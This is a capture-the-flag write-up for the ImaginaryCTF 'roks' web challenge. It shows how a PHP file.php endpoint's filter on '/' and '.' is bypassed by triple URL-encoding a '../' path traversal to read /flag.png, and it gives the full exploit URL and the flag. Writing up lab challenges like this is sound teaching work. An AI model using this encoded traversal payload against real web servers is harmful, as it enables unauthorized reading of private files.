@@ -1,0 +1,33 @@
+We have the source code of a PHP web app, among its Dockerfile and some images
+I notice 2 php files
+index.php
+file.php
+
+navigating to 
+http://roks.chal.imaginaryctf.org/file.php
+
+gives an error:
+Warning: Undefined array key "file" in /var/www/html/file.php on line 2
+Deprecated: urldecode(): Passing null to parameter #1 ($string) of type string is deprecated in /var/www/html/file.php on line 2
+Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/file.php:2) in /var/www/html/file.php on line 10
+Notice: readfile(): Read of 8192 bytes failed with errno=21 Is a directory in /var/www/html/file.php on line 11
+
+In the dockerfile:
+COPY flag.png /
+
+We know the flag is at /flag.png
+
+in file.php, we notice the parameter "file" is urldecoded and put in a variable: $filename = urldecode($_GET["file"]);
+We are blocked if this parameter contains a / or a .
+Else, the variable is urldecoded and concatenated with "images/" to access the file
+we also need to keep in mind that the parameters are already urldecoded once automatically.
+
+So we have to triple urlencode the dots and slashes on a path like
+../../../../../../flag.png
+to bypass the first check, and still open the file at /flag.png
+
+That gives us this parameter: %25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng
+http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng
+
+Flag:
+ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}
